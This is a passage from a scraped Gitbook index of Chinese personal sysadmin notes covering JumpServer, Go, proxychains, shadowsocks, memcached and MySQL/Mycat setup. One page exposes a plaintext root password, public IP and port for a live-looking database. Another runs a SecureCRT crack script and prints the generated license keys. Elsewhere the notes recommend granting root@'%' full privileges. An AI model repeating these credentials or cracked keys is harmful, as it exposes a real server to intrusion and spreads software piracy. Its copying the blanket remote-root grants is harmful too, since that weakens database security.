registry-internal.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-luna:v0.4.0-beta1 docker push registry-internal.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-luna:v0.4.0-beta1 启动 docker-compose up 使用 访问 http://你的主机IP:8080 来访问 Jumpserver 左侧 应用程序接受 Coco和Luna的注册 添加 管理用户 添加 资产 添加授权规则，授权给admin ssh -p2222 admin@你的主机IP 测试连接服务器 访问 http://你的主机IP:5000 访问Luna，点击左侧服务器连接测试 demo使用了开发者模式，并发只能为1 Jumpserver: 访问 账号: admin 密码: admin Luna: 访问 同Jumpserver认证 Coco: ssh -p 2222 admin@demo.jumpserver.org 密码: admin SecureCRT登录Coco ip:192.168.99.100 用户名：zhg 密码:自定义 端口：2222 图片 - https://raw.githubusercontent.com/zouhuigang/zouhuigang.github.io/master/jumpserver/0.gif 在宿主机上生成公钥 ssh-keygen -t rsa -P '' 运行该命令后会生成如下两个文件 id_rsa 和id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7TltnvOrRulPQnDP7s7K8Dxo1U7F0xTZcBvIJr+rqQztL596/ooTUbPo3HKG7lh7BlZXvBD7CaHiYCcDP8rXowEA40DZ+VoNKIzNqjFwHZWwhw2TlmVciDDljzs1RbDTsg38HsLSdNbMKnmiRHQiWsErooVfCpBY7ET2Fz3NsahQouC3az1bhv3gWB3jAlBPeBpQfTimzQ1taHImiHEOlHOXi+xIdwr1A6SMTHIbOiBNzxip5Zx/dkmRSSF5Tvuq6DmfPvXub6trnzKHkLvFoJLDYZlMh2udrZvm8neUGaYhjdiqp51hFmcbTV6sSlc74C/v28MKDrvUf2rD2rH7b docker@default Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/env.html":{"url":"linux/env.html","title":"设置环境变量","keywords":"","body":"设置环境变量 vi /etc/profile 在/etc/profile/后面添加 export PATH=$PATH:/usr/bin export GOROOT=$HOME/go export GOBIN=$GOROOT/bin export GOARCH=386 export GOOS=linux export GOPATH=$HOME/workspacego export PATH=.:$PATH:$GOBIN 使环境变量生效 source /etc/profile 问题 q1:sudo source /etc/profile会发现没source命令 a1: source /etc/profile 或 $ . /etc/profile 就可以了，不需要加sudo。 source是一个内部命令，使用man builtins查看。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/golang-install.html":{"url":"linux/golang-install.html","title":"golang官网","keywords":"","body":"golang官网 https://golang.org/doc/install https://golang.org/dl/ https://www.golangtc.com/download 安装 下载: wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz 解压二进制文件到/usr/local目录 sudo tar zxvf go1.10.3.linux-amd64.tar.gz -C /usr/local 设置环境变量,在/etc/profile/后面添加 export PATH=$PATH:/usr/bin export GOROOT=/usr/local/go export GOBIN=$GOROOT/bin export GOPATH=$HOME/workspacego export PATH=.:$PATH:$GOBIN 使得环境变量生效 source /etc/profile 参考文档: https://github.com/Unknwon/the-way-to-go_ZH_CN/blob/master/eBook/02.3.md https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/01.1.md Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/proxychains.html":{"url":"linux/proxychains.html","title":"1.安装","keywords":"","body":"1.安装 cd /home/zhg/software/ git clone https://github.com/rofl0r/proxychains-ng.git cd proxychains-ng sudo ./configure --prefix=/usr --sysconfdir=/etc sudo make && make install sudo make install-config cd .. && rm -rf proxychains-ng 2.编辑proxychains配置 vi /etc/proxychains.conf //将socks4 127.0.0.1 9050改为 socks5 127.0.0.1 1080 //1080改为你自己的端口 3.检查是否成功 proxychains4 curl ip.cn 显示: 图片 - images 问题汇总 Q: proxychains can't load process....: No such file or directory A: 由于curl命令没有安装，找不到curl Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/software_install.html":{"url":"linux/software_install.html","title":"notepadqq:","keywords":"","body":"notepadqq: Ubuntu下的安装方法: sudo add-apt-repository ppa:notepadqq-team/notepadqq sudo apt-get update sudo apt-get install notepadqq Ubuntu下的卸载方法: sudo apt-get remove notepadqq s udo add-apt-repository --remove ppa:notepadqq-team/notepadqq shadowsocks sudo add-apt-repository ppa:hzwhuang/ss-qt5 sudo apt-get update sudo apt-get install shadowsocks-qt5 翻墙服务搭配好了，可以配合谷歌的插件:https://www.switchyomega.com/download.html使用，目的是在浏览器端，建立一个pac文件，pac文件指向shadowsocks代理软件，实现翻墙上网。 https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 截屏工具 sudo apt-get install shutter 迁移数据库 host = 47.100.76.132 port = 3308 user = root password = Zouhuigang199201 dbname = anooc 备份: mysqldump --databases anooc3 -uroot -P3308 -h47.100.76.132 -p | gzip > /mnt/anooc3-20180610.sql.gz mysql -uanooc_root -p anooc -hrm-uf6m5938b7c1m2835.mysql.rds.aliyuncs.com 暂停网站 kubectl scale golang-anooc-rc-name-v1 --replicas=0 百度云盘 sudo apt install python-pip pip install bypy Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/ssh.html":{"url":"linux/ssh.html","title":"重新生成ssh key:","keywords":"","body":"重新生成ssh key: ssh-keygen 回车，在/home/zhg/.ssh下生成id_rsa,id_rsa.pub 将id_rsa.pub里面的内容复制进bitbucket.org的ssh key 解决navicat乱码问题,然后打开navicat找到选项，将字体设置为文泉驿-微米黑 sudo apt-get install ttf-wqy-microhei #文泉驿-微米黑 sudo apt-get install ttf-wqy-zenhei #文泉驿-正黑 sudo apt-get install xfonts-wqy #文泉驿-点阵宋体 解决sogou输入法安装之后，没法用的问题，安装完成sogou输入法后，打开fcitx配置，将搜狗输入法置顶，即可使用。 如果没有fcitx配置,可以安装一下: sudo add-apt-repository ppa:fcitx-team/nightly // 添加FCITX仓库. sudo apt-get update // 更新仓库. sudo apt-get install fcitx // 安装fcitx输入法框架. 复制windows字体到linux下面 以窗口的形式打开当前目录： nautilus $PWD cd /usr/share/fonts sudo cp -r /media/zhg/mobile-store/字体/** /usr/share/fonts/chinese cd /usr/share/fonts/chinese 刷新字体 mkfontscale mkfontdir fc-cache -fv golang 包管理 go get -u github.com/golang/dep/cmd/dep sudo apt install go-dep $ sudo go get github.com/Masterminds/glide $ sudo go install github.com/Masterminds/glide Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/ssh软件安装.html":{"url":"linux/ssh软件安装.html","title":"sudo perl securecrt_linux_crack.pl /usr/bin/SecureCRT","keywords":"","body":"sudo perl securecrt_linux_crack.pl /usr/bin/SecureCRT 生成注册信息: crack successful License: Name: xiaobo_l Company: www.boll.me Serial Number: 03-15-097355 License Key: AC81ET 9RKAWY 6WP69G 8EQ1JB ABCM3D K4E85M D3WG57 RGFWT2 Issue Date: 08-16-2015 再生成一个看看: It has been cracked License: Name: xiaobo_l Company: www.boll.me Serial Number: 03-15-097355 License Key: AC81ET 9RKAWY 6WP69G 8EQ1JB ABCM3D K4E85M D3WG57 RGFWT2 Issue Date: 08-16-2015 打开软件： 输入注册信息 发现注册不了 whereis SecureCRT 查看安装路径 zhg@zhg-ThinkPad-E450c:~/下载$ whereis SecureCRT SecureCRT: /usr/bin/SecureCRT sudo perl securecrt_linux_crack.pl /usr/bin/SecureCRT It has been cracked License: Name: xiaobo_l Company: www.boll.me Serial Number: 03-94-294583 License Key: ABJ11G 85V1F9 NENFBK RBWB5W ABH23Q 8XBZAC 324TJJ KXRE5D Issue Date: 04-20-2017 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/ulimit.html":{"url":"linux/ulimit.html","title":"更改文件打开数量","keywords":"","body":"＃＃＃　更改文件打开数量 可以看到默认打开的文件数限制为1024个: $ ulimit -n 1024 编辑/etc/profile配置文件，在最后添加一行 ulimit -SHn 65535 问题汇总 Q1: bash: ulimit: open files: 无法修改 limit 值: 不允许的操作 A1： 为啥root用户是可以的？普通用户又会遇到这样的问题？ 看一下/etc/security/limits.conf大概就会明白。 linux对用户有默认的ulimit限制，而这个文件可以配置用户的硬配置和软配置，硬配置是个上限。超出上限的修改就会出“不允许的操作”这样的错误。在limits.conf加上 * soft noproc 10240 * hard noproc 10240 * soft nofile 10240 * hard nofile 10240 就是限制了任意用户的最大线程数和文件数为10240。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/wine.html":{"url":"linux/wine.html","title":"wine的使用","keywords":"","body":"wine的使用 换国内源(http://mirrors.163.com/.help/ubuntu.html)： sudo vi /etc/apt/sources.list 在文件最前面添加(trusty(14.04)) deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ trusty main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ trusty-proposed main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ trusty-backports main restricted universe multiverse 然后保存！ sudo apt-get update 安装 sudo dpkg --add-architecture i386 wget -nc https://dl.winehq.org/wine-builds/Release.key sudo apt-key add Release.key sudo apt-add-repository https://dl.winehq.org/wine-builds/ubuntu/ sudo apt-add-repository 'deb https://dl.winehq.org/wine-builds/ubuntu/ trusty main' sudo apt-get update winehq-staging sudo apt-get install --install-recommends winehq-staging 运行: winecfg 检查 sudo apt install wine-mono sudo apt install wine-gecko 重启wine wineboot 复制字体： sudo cp -r /usr/share/fonts/chinese/** /home/zhg/.wine/drive_c/windows/Fonts/ 登录: 952750120 参考文档 [https://wiki.winehq.org/Ubuntu](https://wiki.winehq.org/Ubuntu) [https://www.hiczp.com/post-142.html](https://www.hiczp.com/post-142.html) [https://jingyan.baidu.com/article/72ee561a7dc16fe16138df92.html](https://jingyan.baidu.com/article/72ee561a7dc16fe16138df92.html) Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/更新源.html":{"url":"linux/更新源.html","title":"问题汇总","keywords":"","body":"问题汇总 Q： 使用Ubnutu18.04安装Shadowsocks-Qt5时 同时使用 sudo add-apt-repository ppa:hzwhuang/ss-qt5 添加源，但是ppa:hzwhuang/ss-qt5 并没有18.04版本的源，所以再执行update时会出现 E: 仓库 “http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic Release” 没有 Release 文件 的错误。 A: 这时，只要编辑/etc/apt/sources.list.d/hzwhuang-ubuntu-ss-qt5-bionic.list 文件,将bionic (18.04版本代号)改成xenial（16.04版本代号）。 sudo vi /etc/apt/sources.list.d/hzwhuang-ubuntu-ss-qt5-bionic.list : deb http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu xenial main deb-src http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu xenial main 然后再执行 sudo apt-get update 成功之后就是 sudo apt-get install shadowsocks-qt5 完成。 参考文档: https://code.launchpad.net/~hzwhuang/+archive/ubuntu/ss-qt5?field.series_filter=trusty Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/桌面快捷方式.html":{"url":"linux/桌面快捷方式.html","title":"cd /usr/share/applications && vi navicat.desktop","keywords":"","body":"cd /usr/share/applications && vi navicat.desktop 例子: [Desktop Entry] Version=1.0 Name=${程序名称} Exec=${可执行文件路径} Terminal=false Icon=${表示该可执行文件的图标} Type=Application Categories=Development navicat.desktop [Desktop Entry] Encoding=UTF-8 Name=Navicat Premium Comment=Navicat Premium Exec=/home/zhg/software/navicat/navicat120_premium_cs_x64/start_navicat Icon=/home/zhg/software/navicat/navicat120_premium_cs_x64/navicat.png Terminal=false Type=Application Categories=GNOME;Application;Development; StartupNotify=true 在Dock最上面的Search里面找到navicat程序，然后拖放到桌面上的Dock即可点击运行。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"linux/虚拟机安装.html":{"url":"linux/虚拟机安装.html","title":"打开包","keywords":"","body":"打开包 VMware-Workstation-Full-14.1.2-8497320.x86_64.bundle 安装 chmod +x VMware-Workstation-Full-14.1.2-8497320.x86_64.bundle 安装图形界面 ./VMware-Workstation-Full-12.1.0-3272444.x86_64.bundle Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"memcached/":{"url":"memcached/","title":"安装memcached","keywords":"","body":"安装memcached yum install -y memcached 启动 systemctl start memcached 状态 systemctl status memcached telnet登录 yum install -y telnet # windows下使用cmd->optionalfeatures->打开telnet客户端即可使用 telnet 127.0.0.1 11211 #输入quit退出telnet 列出所有keys stats items // 这条是命令,注意不要打成status，真tmd fuck 得到结果: STAT items:2:number 542 STAT items:2:age 1807 STAT items:2:evicted 0 STAT items:2:evicted_nonzero 0 STAT items:2:evicted_time 0 STAT items:2:outofmemory 0 STAT items:2:tailrepairs 0 STAT items:2:reclaimed 144 STAT items:2:expired_unfetched 137 STAT items:2:evicted_unfetched 0 STAT items:2:crawler_reclaimed 0 STAT items:2:crawler_items_checked 0 STAT items:2:lrutail_reflocked 0 END 通过itemid获取key 通过命令stats cachedump id 0获得key的值。0表示全部列出 stats cachedump 2 0 #2是上面的items:2 得到: ITEM 57ee9db7e791826e7b5e0b005506702f [1 b; 1515727329 s] ITEM 419932cec5bf37cc297d777102f94a6d [1 b; 1515727325 s] ITEM 4420e6b3e6198018ad08cdd8b5a466c0 [1 b; 1515727323 s] ITEM e72fffbccd4e8c197b91fc44d3fcdc9b [1 b; 1515727323 s] ITEM 058a734bfb704f8703e15d9d97c13657 [1 b; 1515727319 s] ITEM 1adc3a90d0298bd4f288e5ee479166e3 [1 b; 1515727315 s] ITEM 9e1949731eb52626bde8e9acfc1c6798 [1 b; 1515727309 s] ITEM 4b2c7056c4ce9f67861b99d3f97a982a [1 b; 1515727306 s] ITEM 876a05b3695433fbe88f97bd2043c054 [1 b; 1515727302 s] ITEM 898610cc60d532be24629f82dc29c95c [1 b; 1515727294 s] ITEM d0e298fcffa2aab8dc327bc3a5e09251 [1 b; 1515727283 s] END 通过get获取key值 get d0e298fcffa2aab8dc327bc3a5e09251 修改配置 https://www.alibabacloud.com/zh/notice/memcached_03_03 11211端口不安全,更改端口，设置仅仅内网可以访问 /usr/bin/memcached -b -l 10.81.128.152 -p 11244 -m 150 -u root -b 守护进程模式（退出终端窗口之后使程序还在运行），-l 指定IP地址127.0.0.1 ，-p 指定端口号11211，-m 为memcached分配多少内存（单位：M），-u 指定使用哪个用户启动memcached 或者 vi /etc/sysconfig/memcached PORT=\"11211\" USER=\"memcached\" MAXCONN=\"1024\" CACHESIZE=\"64\" OPTIONS=\"\" 修改成: PORT=\"11244\" USER=\"memcached\" MAXCONN=\"1024\" CACHESIZE=\"64\" OPTIONS=\"-l 10.81.128.152\" 说明： PORT：服务启动端口 USER：服务启动用户 MAXCONN：服务配置支持最大连接数 CACHESIZE：服务支持的最大内存，以M为单位。 启动： systemctl start/stop/restart memcached.service 问题汇总 Q1：输入命令一直得到ERROR A1： stats不要打成status https://groups.google.com/forum/#!topic/memcached/b_7Brn8WNOE Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mosh/":{"url":"mosh/","title":"mosh的安装和使用","keywords":"","body":"mosh的安装和使用 服务端安装 yum -y install epel-release yum makecache yum -y install mosh 查看版本: [root@localhost /]# mosh --version mosh 1.3.0 [build mosh 1.3.0] Copyright 2012 Keith Winstein License GPLv3+: GNU GPL version 3 or later . This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. [root@localhost /]# 客户端连接 在chrome浏览器中添加扩展，然后按下图输入服务器ip和用户名即可： 图片 - 20171124150113.png Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mariadb/":{"url":"mysql-lb/mariadb/","title":"删除文件之前，先备份，不要直接删除了，尤其是数据库操作。","keywords":"","body":"删除文件之前，先备份，不要直接删除了，尤其是数据库操作。 systemctl start mariadb 启动不了 报错： Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [Note] InnoDB: Starting shutdown... Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [ERROR] Plugin 'InnoDB' init function returned error. Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed. Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [Note] Plugin 'FEEDBACK' is disabled. Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [ERROR] Unknown/unsupported storage engine: INNODB Apr 07 13:23:31 k8s-master1 mysqld[5489]: 2018-04-07 13:23:31 0 [ERROR] Aborting 解决： 修改 vi /etc/my.cnf.d/server.cnf 增加一行tmpdir = /var/tmp （这个问题的原因是自己定制的my.cnf中没有设置tmpdir信息，在mysqld段增加tmpdir = /var/tmp 即解决问题。） [mysqld] port=3310 tmpdir = /var/tmp http://www.cnblogs.com/zhjh256/p/5763631.html http://www.netingcn.com/mac-os-mysql.html https://www.chriscalender.com/tag/unknownunsupported-storage-engine-innodb/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mycat-master-slave/":{"url":"mysql-lb/mycat-master-slave/","title":"单实例的局限","keywords":"","body":"单实例的局限 目前，我所遇见的问题是在单台mysql中，接口源源不断的进来数据，导致一台mysql的写入并发在高峰时，支持每秒N多数据的写入。 参考： https://github.com/jumpjumpbean/k8smysqlcluster.git http://www.jumpbeandev.com/2017/06/01/mysqlcluster/#more https://blog.yaodataking.com/2016/02/25/mycat-performance-test/ https://blog.yaodataking.com/2016/04/03/jconsole-remote-mycat/ https://blog.yaodataking.com/2016/01/17/mycat-mysql-docker-sample1/#2-1-%E4%B8%8B%E6%8B%89Image k8s上部署 构建docker镜像 master: cd /d/mnt/zouhuigang.github.io/mysql集群方案/mycat-master-slave/Dockerfiles/master docker build -t mysql-master -f ./Dockerfile . docker tag mysql-master registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mysql:master-1.0.0 docker push registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mysql:master-1.0.0 slaver: cd /d/mnt/zouhuigang.github.io/mysql集群方案/mycat-master-slave/Dockerfiles/slave docker build -t mysql-slave -f ./Dockerfile . docker tag mysql-slave registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mysql:slave-1.0.0 docker push registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mysql:slave-1.0.0 测试主从复制 kubectl create -f ./rc-mysql-master kubectl create -f ./svc-mysql-master kubectl create -f ./rc-mysql-slave kubectl create -f ./svc-mysql-slave 参考文档: https://www.jianshu.com/p/509b65e9a4f5 mycat: 基于gaven/mycat镜像，修改schema.xml进行一主一从读写分离自动切换配置，修改server.xml添加db用户名密码等 cd /d/mnt/zouhuigang.github.io/mysql集群方案/mycat-master-slave/Dockerfiles/mycat docker build -t mycat-v1.0.2 -f ./Dockerfile . docker tag mycat-v1.0.2 registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mycat:v1.0.2 docker push registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mycat:v1.0.2 创建: kubectl create -f ./rc-mycat kubectl create -f ./svc-mycat docker: https://www.jianshu.com/p/b73cf127a4b9 启动: docker run --name mysql-mycat -it \\ -v /mnt/a/mycat/conf:/usr/local/mycat/conf \\ -v /mnt/a/mycat/logs:/usr/local/mycat/logs \\ -p 8066:8066 -p 9066:9066 \\ registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/mycat:v1.0.2 登录: mysql -uroot -p -h127.0.0.1 -P8066 #密码: root mysql -uroot -p -h127.0.0.1 -P9066 #密码: root show @@heartbeat; show @@database; #查看逻辑数据库 show @@datanode; #查看分片节点 show @@server; #查看服务器状态 show @@version; #查看版本 日志debug开启: 将Mycat的日志模式改为debug模式，执行sql后，到日志查看执行的节点ip就知道是不是自己设置的读节点 在logs文件夹下执行 tail -f mycat.log,你用navicat增删改成会在控制台刷出日志。注意，conf文件夹下log4j。xml里的info改成debug 将mycat的日志输出级别改完debug，在conf/log4j2.xml里配置 查询语句不要加事务，否则读操作会被分发到写服务器上。 日志: 将info改为debug,即可查看日志 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mycat-master-slave/读写分离.html":{"url":"mysql-lb/mycat-master-slave/读写分离.html","title":"读写分离","keywords":"","body":"读写分离 创建库: create database yy_sys; 创建表: create table travelrecord (id bigint not null primary key,user_id varchar(100),traveldate DATE, fee decimal,days int); 插入数据: insert into travelrecord (id,user_id,traveldate,fee,days) values(100001,'xiaohong','2014-01-06',510.5,3); explain insert into travelrecord (id,user_id,traveldate,fee,days) values(100001,'xiaohong','2014-01-06',510.5,3); Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mysql/":{"url":"mysql-lb/mysql/","title":"mysql单独安装，修改端口","keywords":"","body":"mysql单独安装，修改端口 #yum install -y mysql yum install mariadb-server mariadb 日志： Updated: mariadb.x86_64 1:5.5.52-1.el7 Dependency Updated: mariadb-libs.x86_64 1:5.5.52-1.el7 Complete! 由于MySQL被Oracle收购，所以从Centos7开始不再默认安装mysql而用Mariadb代替，需要使用一些方法才能正确安装Mysql CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替了 相关命令 systemctl start mariadb #启动MariaDB systemctl stop mariadb #停止MariaDB systemctl restart mariadb #重启MariaDB systemctl enable mariadb #设置开机启动 所以先启动数据库 [root@yl-web yl]# systemctl start mariadb 然后就可以正常使用mysql了 方式二 由于用mariadb不习惯，还是安装mysql吧 yum -y remove mariadb-libs 下载mysql的repo源 wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm 安装mysql-community-release-el7-5.noarch.rpm包 sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm 安装这个包后，会获得两个mysql的yum repo源：/etc/yum.repos.d/mysql-community.repo，/etc/yum.repos.d/mysql-community-source.repo 3.安装mysql sudo yum install mysql-server 根据步骤安装就可以了，不过安装完成后，密码为随机密码，需要重置密码。 4.修改端口： [mysqld] port = 3308 #修改为你想要改的端口 vi /etc/my.cnf datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock [mysql.server] user=mysql basedir=/var/lib [safe_mysqld] err-log=/var/log/mysqld.log pid-file=/var/run/mysqld/mysqld.pid 启动 systemctl start mysql 重置密码 重置密码前，首先要登录 mysql -u root mysql > use mysql; mysql > update user set password=password('yy2017622') where user='root'; mysql > flush privileges; mysql > exit; #./mysqladmin -u root -p password #grep \"password\" /var/log/mysqld.log 6.开放端口 iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3308 -j ACCEPT service iptables restart 问题： 解决远程连接mysql错误1130 远程连接Mysql服务器的数据库，错误代码是1130，ERROR 1130: Host xxx.xxx.xxx.xxx is not allowed to connect to this MySQL server猜想是无法给远程连接的用户权限问题。 这样子操作mysql库，即可解决。 在本机登入mysql后，更改 “mysql” 数据库里的 “user” 表里的 “host” 项，从”localhost”改称'%'即可 mysql -u root -p use mysql; select 'host' from user where user='root'; update user set host = '%' where user ='root'; flush privileges; select 'host' from user where user='root'; 或者： GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'yy2017622' WITH GRANT OPTION; flush privileges; ERROR 1062 (23000): Duplicate entry '%-root' for key 'PRIMARY'： 然后查看了下数据库的host信息如下： MySQL> select host from user where user = 'root'; +-----------------------+ | host | +-----------------------+ | % | | 127.0.0.1 | | localhost.localdomain | +-----------------------+ 3 rows in set (0.00 sec) host已经有了%这个值，所以直接运行命令： 复制代码 代码如下: MySQL>flush privileges; 再用MySQL administrator连接...成功！！ 参考： In CentOS 7 - Maria DB is already installed. due to this you are facing the issue.{MariaDB is a compatible implementation of MySQL}. If you want to install Mysql - first you should remove the current existing Mari DB. Step 1 : Remove Maria DB completely i.e. yum -y remove mariadb-libs Step 2 : Install MySQL i. wget http://dev.mysql.com/get/mysql57-community-release-el7-7.noarch.rpm ii. yum localinstall mysql57-community-release-el7-7.noarch.rpm iii. yum repolist enabled | grep \"mysql.*-community.*\" iv. yum install mysql-community-server v. yum-config-manager --disable mysql57-community vi. yum-config-manager --enable mysql56-community viii. service mysqld start ix. service mysqld status x. mysql --version xi. mysql -u root -p https://www.cnblogs.com/starof/p/4680083.html http://www.mamicode.com/info-detail-503994.html https://stackoverflow.com/questions/30696902/fails-installing-mysql-on-centos-7 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mysql/mysql安装.html":{"url":"mysql-lb/mysql/mysql安装.html","title":"安装","keywords":"","body":"安装 mkdir -p /home/mysql-install && cd /home/mysql-install wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm 安装这个包后，会获得两个mysql的yum repo源： /etc/yum.repos.d/mysql-community.repo /etc/yum.repos.d/mysql-community-source.repo 安装mysql sudo yum install mysql-server 修改端口: vi /etc/my.cnf Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mysql查询/视图.html":{"url":"mysql-lb/mysql查询/视图.html","title":"SELECT","keywords":"","body":"SELECT 1 as level,client_code,media_id,media_sub_id,date_format(create_time, '%Y-%m-%d' ) AS active_date , count( 0 ) AS can_post_num, count( ( CASE WHEN ( xbd_resource_post.has_post = 1 ) THEN 1 ELSE NULL END ) ) AS has_post_num, count( ( CASE WHEN ( xbd_resource_post.post_result = 1 ) THEN 1 ELSE NULL END ) ) AS success_post_num FROM xbd_resource_post WHERE rp_id > ( SELECT track_sync.last_sync_id FROM track_sync WHERE ( track_sync.table_name = 'stats_xbd_resource_post' ) LIMIT 1 ) AND xbd_resource_post.client_code IS NOT NULL GROUP BY client_code,active_date UNION ALL SELECT 2 as level,client_code,media_id,media_sub_id,date_format(create_time, '%Y-%m-%d' ) AS active_date , COUNT( ) AS can_post_num, COUNT( CASE WHEN has_post=1 THEN 1 ELSE NULL END ) AS has_post_num, COUNT( CASE WHEN post_result =1 THEN 1 ELSE NULL END ) AS success_post_num FROM xbd_resource_post WHERE rp_id > ( SELECT track_sync.last_sync_id FROM track_sync WHERE ( track_sync.table_name = 'stats_xbd_resource_post' ) LIMIT 1 ) and client_code is not null group by client_code,media_id,active_date UNION ALL SELECT 3 as level,client_code,media_id,media_sub_id,date_format(create_time, '%Y-%m-%d' ) AS active_date , COUNT( ) AS can_post_num, COUNT( CASE WHEN has_post=1 THEN 1 ELSE NULL END ) AS has_post_num, COUNT( CASE WHEN post_result =1 THEN 1 ELSE NULL END ) AS success_post_num FROM xbd_resource_post WHERE rp_id > ( SELECT track_sync.last_sync_id FROM track_sync WHERE ( track_sync.table_name = 'stats_xbd_resource_post' ) LIMIT 1 ) and client_code is not null group by client_code,media_id,media_sub_id,active_date ORDER BY active_date Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/mysql重置密码.html":{"url":"mysql-lb/mysql重置密码.html","title":"查看版本","keywords":"","body":"查看版本 mysql > status mysql Ver 8.0.11 for Linux on x86_64 (Source distribution) 修改密码（老版本） $ mysql use mysql; update user set Password = password (`123456`) where User = `root` ; select host,user from user; update user set password=('123456') where user='root'; mysql 8修改密码： mysql -u root -p '原来的密码' //进入数据库中 show databases； use mysql； 使用下面的语句修改密码： ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码'; 例如： ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '123456'; 推出，使用新的密码登陆 问题汇总 Q1: update user set password=('123456') where user='root'; ERROR 1054 (42S22): Unknown column 'password' in 'field list' A1: 新版本mysql没有password字段了 update mysql.user set authentication_string=password('123456') where user='root' ; Q2: mysql 配置文件目录：/etc/my.cnf root 密码为空的时候配置文件中下面这句： skip-grant-tables GRANT ALL PRIVILEGES ON *.* TO IDENTIFIED BY '123' WITH GRANT OPTION; 执行这句时候错误： ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement mysql> GRANT ALL PRIVILEGES ON *.* TO IDENTIFIED BY '123' WITH GRANT OPTION; ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement A2: 这个时候我们只需要 flush privileges 一下，在添加用户就OK了， mysql> flush privileges; Query OK, 0 rows affected (0.01 sec) mysql> GRANT ALL PRIVILEGES ON *.* TO IDENTIFIED BY '123' WITH GRANT OPTION; Query OK, 0 rows affected (0.00 sec) 这个时候我们成功搞定了，再登录就可以了。 如果报错如下信息： Error: Cannot retrieve repository metadata (repomd.xml) for repository: InstallMedia. Please verify its path and try again You could try using --skip-broken to work around the problem You could try running: rpm -Va --nofiles --nodigest 